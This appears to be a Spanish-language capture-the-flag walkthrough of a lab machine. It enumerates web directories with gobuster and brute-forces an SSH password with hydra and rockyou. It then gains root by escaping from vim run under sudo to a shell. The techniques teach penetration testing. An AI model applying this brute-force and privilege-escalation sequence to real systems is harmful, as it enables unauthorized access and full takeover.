```bash
  ❯❯ /home/v3ctr4x : gobuster dir -u http://172.19.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .php,-sh,.py,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.19.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,-sh,py,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

tenemos un secret.php, vamos a ver que hay dentro de ese php

![[Pasted image 20250506121627.png]]

Puede ser uno de los usuarios que tiene el sistema para ssh, vamos a intentar con rockyou en hydra para sacar la contraseña al usuario

```bash

  ❯❯ /home/v3ctr4x : hydra -l mario -P /home/v3ctr4x/Descargas/rockyou.txt ssh://172.19.0.2 -t 10
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-06 12:20:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344398 login tries (l:1/p:14344398), ~1434440 tries per task
[DATA] attacking ssh://172.19.0.2:22/
[22][ssh] host: 172.19.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-06 12:20:45
```

ya podemos hacer ssh dentro de la maquina

```bash

  ❯❯ /home/v3ctr4x : ssh mario@172.19.0.2
mario@172.19.0.2s password: 
Linux 65002dba0472 6.14.4-arch1-2 #1 SMP PREEMPT_DYNAMIC Tue, 29 Apr 2025 09:23:13 +0000 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May  6 10:23:57 2025 from 172.19.0.1
mario@65002dba0472:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 65002dba0472:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 65002dba0472:
    (ALL) /usr/bin/vim
mario@65002dba0472:~$    
```

Tenemos un vector de ataque, ahora hay que aprovecharlo

```bash
:!sh
# whoami
root
# 
```

Dentro de vim ejecutandolo como sudo obtenemos una shell de root, esto es debido a que cuando ejecutamos vim lo hacemos con sudo, por lo que si dentro de vim ejecutamos una shell nos haremos superusuario